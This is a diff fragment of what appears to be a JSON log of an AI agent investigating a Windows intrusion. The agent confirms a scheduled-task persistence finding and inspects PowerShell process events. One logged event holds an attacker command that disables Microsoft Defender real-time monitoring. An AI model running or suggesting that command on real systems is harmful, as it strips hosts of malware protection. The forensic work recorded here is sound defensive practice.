+        "timestamp": "2026-06-03T15:15:12.776374"
+      },
+      {
+        "iteration": 5,
+        "thought": "Let me complete the lateral movement finding with the full details:",
+        "action": "confirm_finding({\"title\": \"Persistence via Scheduled Task Creation\", \"description\": \"Attacker created a malicious scheduled task disguised as legitimate Windows Updat)",
+        "observation": "Finding #7 confirmed and added to report: Persistence via Scheduled Task Creation",
+        "timestamp": "2026-06-03T15:15:12.776427"
+      },
+      {
+        "iteration": 6,
+        "thought": "Perfect! Let me verify the findings are complete by checking the process tree to understand the full attack chain:",
+        "action": "get_process_tree({\"process_name\": \"powershell.exe\"})",
+        "observation": "Found 11 matching events. Showing top 10:\n\n[1] EventID=4688 | Time=2024-06-15T02:55:58 | Host=WORKSTATION-01 | Data={\"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMo",
+        "timestamp": "2026-06-03T15:15:19.454945"
+      }
+    ]
+  }
+}
